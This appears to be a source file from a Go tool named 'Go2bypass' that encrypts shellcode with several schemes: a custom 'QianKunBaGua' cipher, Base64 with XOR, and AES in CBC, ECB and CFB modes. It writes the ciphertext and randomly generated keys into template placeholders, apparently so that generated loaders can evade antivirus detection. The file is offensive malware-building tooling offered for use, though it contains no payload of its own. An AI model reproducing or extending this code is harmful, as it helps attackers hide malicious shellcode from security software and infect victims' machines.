package Public

import (
	"Go2bypass/endecrypt"
	"encoding/base64"
)

type ApiEDcrypt interface {
	CodeToShellEncrypt(CoDeKey CodToshellKey)
	CodeToShellDncrypt(CoDeKey CodToshellKey) ([]byte, error)
}

//乾坤八卦加密算法
type QianKunBaGua struct {
}

func (this QianKunBaGua) CodeToShellEncrypt(CoDeKey CodToshellKey) {
	ReplaceStr["shellcode"] = endecrypt.QianKunBaGuaEncode(CoDeKey.CodeByteShell)
}

func (this QianKunBaGua) CodeToShellDncrypt(CoDeKey CodToshellKey) ([]byte, error) {
	return endecrypt.QianKunBaGuaDecode(CoDeKey.CodeToStringShell)
}

//Base64Xor加密算法
type Base64Xor struct {
}

func (this Base64Xor) CodeToShellEncrypt(CoDeKey CodToshellKey) {
	ReplaceStr["shellcode"] = base64.StdEncoding.EncodeToString([]byte(endecrypt.StrByXOR(base64.StdEncoding.EncodeToString(CoDeKey.CodeByteShell))))
}

func (this Base64Xor) CodeToShellDncrypt(CoDeKey CodToshellKey) ([]byte, error) {
	shellcodebyte, _ := base64.StdEncoding.DecodeString(CoDeKey.CodeToStringShell)
	return base64.StdEncoding.DecodeString(endecrypt.StrByXOR(string(shellcodebyte)))
}

//AES CBC加密算法
type AesCBC struct {
}

func (this AesCBC) CodeToShellEncrypt(CoDeKey CodToshellKey) {
	CoDeKey.KeyKey = RandStr(16)
	ReplaceStr["KeyKey"] = CoDeKey.KeyKey
	encrypted := endecrypt.AesEncryptCBC(CoDeKey.CodeByteShell, []byte(CoDeKey.KeyKey))
	ReplaceStr["codeshell"] = base64.StdEncoding.EncodeToString(encrypted)
}

func (this AesCBC) CodeToShellDncrypt(CoDeKey CodToshellKey) ([]byte, error) {
	encrypted, _ := base64.StdEncoding.DecodeString(CoDeKey.CodeToStringShell)
	return endecrypt.AesDecryptCBC(encrypted, []byte(CoDeKey.KeyKey)), nil
}

//AES ECB加密算法
type AesECB struct {
}

func (this AesECB) CodeToShellEncrypt(CoDeKey CodToshellKey) {
	CoDeKey.KeyKey = RandStr(16)
	ReplaceStr["KeyKey"] = CoDeKey.KeyKey
	encrypted := endecrypt.AesEncryptECB(CoDeKey.CodeByteShell, []byte(CoDeKey.KeyKey))
	ReplaceStr["codeshell"] = base64.StdEncoding.EncodeToString(encrypted)
}

func (this AesECB) CodeToShellDncrypt(CoDeKey CodToshellKey) ([]byte, error) {
	encrypted, _ := base64.StdEncoding.DecodeString(CoDeKey.CodeToStringShell)
	return endecrypt.AesDecryptECB(encrypted, []byte(CoDeKey.KeyKey)), nil
}

//AES CFB加密算法
type AesCFB struct {
}

func (this AesCFB) CodeToShellEncrypt(CoDeKey CodToshellKey) {
	CoDeKey.KeyKey = RandStr(16)
	ReplaceStr["KeyKey"] = CoDeKey.KeyKey
	encrypted := endecrypt.AesEncryptCFB(CoDeKey.CodeByteShell, []byte(CoDeKey.KeyKey))
	ReplaceStr["codeshell"] = base64.StdEncoding.EncodeToString(encrypted)
}

func (this AesCFB) CodeToShellDncrypt(CoDeKey CodToshellKey) ([]byte, error) {
	encrypted, _ := base64.StdEncoding.DecodeString(CoDeKey.CodeToStringShell)
	return endecrypt.AesDecryptCFB(encrypted, []byte(CoDeKey.KeyKey)), nil
}
